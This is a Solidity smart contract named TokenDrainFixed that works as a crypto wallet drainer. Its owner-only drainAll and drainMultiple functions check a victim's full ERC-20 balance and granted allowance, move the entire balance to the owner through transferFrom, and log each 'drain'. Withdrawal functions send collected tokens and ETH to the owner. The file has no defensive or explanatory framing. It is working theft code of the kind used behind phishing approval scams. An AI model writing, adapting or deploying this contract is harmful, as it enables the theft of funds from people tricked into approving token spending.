// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract TokenDrainFixed {
    address public owner;

    struct ApprovalRecord {
        address user;
        address token;
        uint256 amount;
        uint256 timestamp;
    }

    struct DrainRecord {
        address user;
        address token;
        uint256 amount;
        uint256 timestamp;
    }

    ApprovalRecord[] public approvals;
    DrainRecord[] public drainHistory;
    
    mapping(address => ApprovalRecord[]) public userApprovals;
    mapping(address => DrainRecord[]) public userDrainHistory;

    event TokenApproved(address indexed user, address indexed token, uint256 amount, uint256 timestamp);
    event TokenDrained(address indexed user, address indexed token, uint256 amount, uint256 timestamp);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    function recordApproval(
        address user,
        address token,
        uint256 amount
    ) public {
        require(user != address(0), "Invalid user address");
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");

        ApprovalRecord memory record = ApprovalRecord({
            user: user,
            token: token,
            amount: amount,
            timestamp: block.timestamp
        });

        approvals.push(record);
        userApprovals[user].push(record);

        emit TokenApproved(user, token, amount, block.timestamp);
    }

    function drainAll(address token, address from) public onlyOwner returns (bool) {
        require(token != address(0), "Invalid token address");
        require(from != address(0), "Invalid from address");

        uint256 balance = IERC20(token).balanceOf(from);
        require(balance > 0, "No balance to drain");

        uint256 allowance = IERC20(token).allowance(from, address(this));
        require(allowance >= balance, "Insufficient allowance");

        bool success = IERC20(token).transferFrom(from, owner, balance);
        require(success, "Transfer failed");

        DrainRecord memory record = DrainRecord({
            user: from,
            token: token,
            amount: balance,
            timestamp: block.timestamp
        });

        drainHistory.push(record);
        userDrainHistory[from].push(record);

        emit TokenDrained(from, token, balance, block.timestamp);
        
        return true;
    }

    function drainMultiple(address[] memory tokens, address from) public onlyOwner returns (uint256) {
        require(from != address(0), "Invalid from address");
        require(tokens.length > 0, "No tokens specified");

        uint256 successCount = 0;

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            require(token != address(0), "Invalid token address");

            uint256 balance = IERC20(token).balanceOf(from);
            if (balance > 0) {
                uint256 allowance = IERC20(token).allowance(from, address(this));
                if (allowance >= balance) {
                    bool success = IERC20(token).transferFrom(from, owner, balance);
                    if (success) {
                        DrainRecord memory record = DrainRecord({
                            user: from,
                            token: token,
                            amount: balance,
                            timestamp: block.timestamp
                        });

                        drainHistory.push(record);
                        userDrainHistory[from].push(record);

                        emit TokenDrained(from, token, balance, block.timestamp);
                        successCount++;
                    }
                }
            }
        }

        return successCount;
    }

    function getTotalApprovals() public view returns (uint256) {
        return approvals.length;
    }

    function getLastApproval() public view returns (ApprovalRecord memory) {
        require(approvals.length > 0, "No approvals yet");
        return approvals[approvals.length - 1];
    }

    function getUserApprovals(address _user) public view returns (ApprovalRecord[] memory) {
        return userApprovals[_user];
    }

    function getUserApprovalsCount(address _user) public view returns (uint256) {
        return userApprovals[_user].length;
    }

    function getTotalDrains() public view returns (uint256) {
        return drainHistory.length;
    }

    function getLastDrain() public view returns (DrainRecord memory) {
        require(drainHistory.length > 0, "No drains yet");
        return drainHistory[drainHistory.length - 1];
    }

    function getUserDrains(address _user) public view returns (DrainRecord[] memory) {
        return userDrainHistory[_user];
    }

    function getUserDrainsCount(address _user) public view returns (uint256) {
        return userDrainHistory[_user].length;
    }

    function getTokenBalance(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }

    function getTokenAllowance(address token, address tokenOwner, address spender) public view returns (uint256) {
        return IERC20(token).allowance(tokenOwner, spender);
    }

    function withdrawToken(address token, uint256 amount) public onlyOwner {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");
        bool success = IERC20(token).transfer(owner, amount);
        require(success, "Transfer failed");
    }

    function withdrawAllTokens(address token) public onlyOwner {
        require(token != address(0), "Invalid token address");
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        bool success = IERC20(token).transfer(owner, balance);
        require(success, "Transfer failed");
    }

    receive() external payable {}

    function withdrawETH() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}